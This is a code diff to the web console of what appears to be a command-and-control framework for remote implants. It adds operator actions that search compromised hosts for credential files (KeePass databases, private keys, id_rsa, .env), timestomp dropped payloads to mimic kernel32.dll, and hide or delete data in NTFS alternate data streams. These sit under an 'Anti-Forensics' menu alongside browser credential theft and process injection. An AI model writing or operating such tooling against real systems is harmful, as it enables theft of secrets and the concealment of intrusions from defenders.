@@ -2803,6 +2803,81 @@ async function runCtxAction(act) {
     }
     case 'openProcessList':  openProcessList(act.id); break;
     case 'openFileExplorer': openFileExplorer(act.id); break;
+    case 'searchFiles': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      // act.pattern may have multiple space-separated patterns — run one SEARCH per pattern
+      const patterns = (act.pattern||'').split(' ').filter(Boolean);
+      for (const p of patterns) {
+        const r = await api('POST', `/api/agents/${aid}/task`, {type:'SEARCH', args:p});
+        if (r?.ok) addConsoleOutputForAgent(aid, `[~] search ${p} queued`, '', null);
+      }
+      break;
+    }
+    case 'searchFilesCustom': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      showPrompt('File Search', 'Pattern (e.g. *.kdbx) — optionally prefix with root path', '*.kdbx', pattern => {
+        api('POST', `/api/agents/${aid}/task`, {type:'SEARCH', args:pattern})
+          .then(r => { if (r?.ok) toast('Search queued'); });
+      });
+      break;
+    }
+    case 'timestompFile': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      showPrompt('Timestomp', 'Target file path', 'C:\\Windows\\Temp\\payload.exe', file => {
+        const ref = act.ref || '';
+        api('POST', `/api/agents/${aid}/task`, {type:'TIMESTOMP', args: ref ? `${file} ${ref}` : file})
+          .then(r => { if (r?.ok) toast('Timestomp queued'); });
+      });
+      break;
+    }
+    case 'timestompCustom': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      showQuickForm('⏱ Timestomp', [
+        {key:'file',   label:'Target file',  ph:'C:\\Windows\\Temp\\payload.exe', def:''},
+        {key:'ref',    label:'Reference (date YYYY-MM-DD, path, or blank for kernel32.dll)', ph:'2019-06-15', def:''},
+      ], vals => {
+        if (!vals.file) { toast('File required','red'); return; }
+        const args = vals.ref ? `${vals.file} ${vals.ref}` : vals.file;
+        api('POST', `/api/agents/${aid}/task`, {type:'TIMESTOMP', args})
+          .then(r => { if (r?.ok) toast('Timestomp queued'); });
+      });
+      break;
+    }
+    case 'adsOp': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      const op = act.op;
+      if (op === 'list') {
+        showPrompt('ADS List', 'File path', 'C:\\Windows\\Temp\\file.txt', path => {
+          api('POST', `/api/agents/${aid}/task`, {type:'ADS_LIST', args:path})
+            .then(r => { if (r?.ok) toast('ADS list queued'); });
+        });
+      } else if (op === 'read') {
+        showPrompt('ADS Read', 'file.txt:streamname', '', arg => {
+          api('POST', `/api/agents/${aid}/task`, {type:'ADS_READ', args:arg})
+            .then(r => { if (r?.ok) toast('ADS read queued'); });
+        });
+      } else if (op === 'write') {
+        showQuickForm('✍️ ADS Write', [
+          {key:'target',  label:'file:stream',  ph:'file.txt:hidden', def:''},
+          {key:'content', label:'Content',       ph:'hidden data…', def:''},
+        ], vals => {
+          if (!vals.target || !vals.content) { toast('Target and content required','red'); return; }
+          api('POST', `/api/agents/${aid}/task`, {type:'ADS_WRITE', args:vals.target, payload:btoa(vals.content)})
+            .then(r => { if (r?.ok) toast('ADS write queued'); });
+        });
+      } else if (op === 'del') {
+        showPrompt('ADS Delete', 'file.txt:streamname', '', arg => {
+          api('POST', `/api/agents/${aid}/task`, {type:'ADS_DEL', args:arg})
+            .then(r => { if (r?.ok) toast('ADS delete queued'); });
+        });
+      }
+      break;
+    }
     case 'injectModal':      openInjectModal(act.id, act.mode, act.pid); break;
     case 'screenshotToLoot': {
       const aid = act.id;
@@ -3403,6 +3478,22 @@ function agentContextMenu(e, agentId) {
       null,
       {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',  args:''}},
       {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK', args:''}},
+    ]},
+    {_sub:'🔎  File Search', items:[
+      {label:'🔑  Sensitive files (kdbx/pfx/key)', action:{fn:'searchFiles', id, pattern:'*.kdbx *.pfx *.pem *.key id_rsa *.p12'}},
+      {label:'⚙️  Config files (xml/config/ini)',  action:{fn:'searchFiles', id, pattern:'*.config *.xml *.ini *.env'}},
+      {label:'📄  Office docs (docx/xlsx)',         action:{fn:'searchFiles', id, pattern:'*.docx *.xlsx *.xls *.doc'}},
+      null,
+      {label:'✏️  Custom pattern…',                action:{fn:'searchFilesCustom', id}},
+    ]},
+    {_sub:'🕵️  Anti-Forensics', items:[
+      {label:'⏱  Timestomp (copy from kernel32.dll)',    action:{fn:'timestompFile', id, ref:''}},
+      {label:'📅  Timestomp (set date…)',                action:{fn:'timestompCustom', id}},
+      null,
+      {label:'📂  ADS List…',   action:{fn:'adsOp', id, op:'list'}},
+      {label:'📖  ADS Read…',   action:{fn:'adsOp', id, op:'read'}},
+      {label:'✍️  ADS Write…',  action:{fn:'adsOp', id, op:'write'}},
+      {label:'🗑  ADS Delete…', action:{fn:'adsOp', id, op:'del'}},
     ]},
     {_sub:'🎯  Collection', items:[
       {label:'📸  Screenshot → Loot',        action:{fn:'screenshotToLoot', id}},
@@ -8291,6 +8382,33 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'kill':       taskType='KILL'; break;
     case 'clip':       taskType='CLIP_GET'; break;
     case 'browsercreds': case 'browser-creds': case 'bcreds': taskType='BROWSER_CREDS'; break;
+    case 'search': {
+      // search [root] <pattern>   e.g. search *.kdbx  or  search C:\Users *.pfx
+      taskType = 'SEARCH'; taskArgs = args; break;
+    }
+    case 'timestomp': {
+      // timestomp <file> [YYYY-MM-DD|ref_file]
+      taskType = 'TIMESTOMP'; taskArgs = args; break;
+    }
+    case 'ads': {
+      const [sub, ...rest] = args.split(' ');
+      const joined = rest.join(' ');
+      switch (sub) {
+        case 'list': taskType='ADS_LIST'; taskArgs=joined; break;
+        case 'read': taskType='ADS_READ'; taskArgs=joined; break;
+        case 'del': case 'delete': taskType='ADS_DEL'; taskArgs=joined; break;
+        case 'write': {
+          // ads write file.txt:stream <text>
+          const [target, ...data] = joined.split(' ');
+          taskType='ADS_WRITE';
+          taskArgs=target;
+          payload=btoa(data.join(' '));
+          break;
+        }
+        default: addConsoleOutput('usage: ads list|read|write|del <file>[:<stream>]','',null); return;
+      }
+      break;
+    }
     case 'sysinfo':    taskType='SYSINFO'; break;
     case 'getpid':     taskType='GETPID'; break;
     case 'ppid':       taskType='PPID'; break;
